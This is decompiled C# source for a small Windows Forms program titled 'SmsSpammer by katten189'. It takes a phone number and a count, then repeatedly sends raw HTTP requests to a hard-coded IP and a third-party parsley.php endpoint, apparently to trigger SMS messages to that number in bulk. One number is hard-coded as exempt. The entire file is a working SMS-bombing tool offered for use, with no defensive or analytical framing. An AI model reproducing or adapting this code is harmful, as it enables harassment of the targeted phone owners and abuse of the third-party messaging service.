using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SmsSpam;

public class Form1 : Form
{
	private IContainer icontainer_0 = null;

	private TextBox textBox1;

	private Button button1;

	private NumericUpDown numericUpDown1;

	private Label label1;

	private Label label2;

	public Form1()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)textBox1).get_Text();
		decimal value = numericUpDown1.get_Value();
		if (text != "0703787886")
		{
			for (int i = 0; (decimal)i < value; i++)
			{
				TcpClient tcpClient = new TcpClient("194.236.32.162", 80);
				NetworkStream stream = tcpClient.GetStream();
				byte[] bytes = Encoding.ASCII.GetBytes("GET /parsley.php?mobilnummer=" + text + "&send=SKICKA HTTP/1.1\r\nHost: www.welcometothewall.com\r\n\r\n");
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				tcpClient.Close();
			}
			MessageBox.Show("Done.");
		}
		else
		{
			MessageBox.Show("NOES");
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		textBox1 = new TextBox();
		button1 = new Button();
		numericUpDown1 = new NumericUpDown();
		label1 = new Label();
		label2 = new Label();
		((ISupportInitialize)numericUpDown1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Location(new Point(58, 10));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(100, 20));
		((Control)textBox1).set_TabIndex(0);
		((Control)button1).set_Location(new Point(270, 11));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 20));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Skicka");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)numericUpDown1).set_Location(new Point(204, 11));
		((Control)numericUpDown1).set_Name("numericUpDown1");
		((Control)numericUpDown1).set_Size(new Size(60, 20));
		((Control)numericUpDown1).set_TabIndex(2);
		numericUpDown1.set_Value(new decimal(new int[4] { 1, 0, 0, 0 }));
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(3, 13));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(49, 13));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("Nummer:");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(164, 13));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(34, 13));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Antal:");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(352, 40));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)numericUpDown1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text(" SmsSpammer by katten189");
		((ISupportInitialize)numericUpDown1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
